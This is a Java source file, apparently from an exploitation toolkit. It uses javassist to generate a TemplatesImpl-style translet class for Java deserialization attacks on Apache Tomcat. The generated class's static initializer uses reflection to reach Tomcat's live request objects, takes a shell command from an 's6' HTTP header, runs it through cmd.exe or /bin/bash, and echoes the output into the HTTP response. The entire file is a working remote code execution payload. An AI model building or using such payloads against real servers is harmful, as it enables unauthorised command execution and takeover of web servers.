package cn.safe6.payload;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.coyote.RequestInfo;

public class TomcatEcho {

    public static byte[] getPayload() throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));

        CtClass ctClass = classPool.makeClass("tomcatEcho" + System.nanoTime());
        ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));
        ctClass.addMethod(CtMethod.make("    public static Object getField(Object obj,String fieldName) throws Exception{\n" +
                "        java.lang.reflect.Field f0 = null;\n" +
                "        Class clas = obj.getClass();\n" +
                "\n" +
                "        while (clas != Object.class){\n" +
                "            try {\n" +
                "                f0 = clas.getDeclaredField(fieldName);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException e){\n" +
                "                clas = clas.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (f0 != null){\n" +
                "            f0.setAccessible(true);\n" +
                "            return f0.get(obj);\n" +
                "        }else {\n" +
                "            throw new NoSuchFieldException(fieldName);\n" +
                "        }\n" +
                "    }",ctClass));

        String method = "        try {\n" +
                "            boolean flag = false;\n" +
                "            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),\"threads\");\n" +
                "            for (int i=0;i<threads.length;i++){\n" +
                "                Thread thread = threads[i];\n" +
                "                if (thread != null){\n" +
                "                    String threadName = thread.getName();\n" +
                "                    if (!threadName.contains(\"exec\") && threadName.contains(\"http\")){\n" +
                "                        Object target = getField(thread,\"target\");\n" +
                "                        Object global = null;\n" +
                "                        if (target instanceof Runnable){\n" +
                "                            // 需要遍历其中的 this$0/handler/global\n" +
                "                            // 需要进行异常捕获，因为存在找不到的情况\n" +
                "                            try {\n" +
                "                                global = getField(getField(getField(target,\"this$0\"),\"handler\"),\"global\");\n" +
                "                            } catch (NoSuchFieldException fieldException){\n" +
                "                                fieldException.printStackTrace();\n" +
                "                            }\n" +
                "                        }\n" +
                "                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors\n" +
                "                        if (global != null){\n" +
                "                            java.util.List processors = (java.util.List) getField(global,\"processors\");\n" +
                "                            for (i=0;i<processors.size();i++){\n" +
                "                                org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) processors.get(i);\n" +
                "                                if (requestInfo != null){\n" +
                "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,\"req\");\n" +
                "                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
                "                                    String cmd = null;\n" +
                "                                    // 从 header 中获取\n" +
                "                                    if (request.getHeader(\"s6\") != null){\n" +
                "                                        cmd = request.getHeader(\"s6\");\n" +
                "                                    }\n" +
                "\n" +
                "                                    if (cmd != null){\n" +
                "                                        String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/bash\", \"-c\", cmd};\n" +
                "                                        byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes();"+
                "                                        java.io.Writer writer = response.getWriter();\n" +
                "                                        writer.write(\"$$$\\n\");\n" +
                "                                        writer.write(new String(result));\n" +
                "                                        writer.write(\"$$$\\n\");\n" +
                "                                        writer.flush();\n" +
                "                                        flag = true;\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                    if (flag){\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                }\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "                if (flag){\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }";
        ctClass.makeClassInitializer().insertBefore(method);
        return ctClass.toBytecode();
    }

}
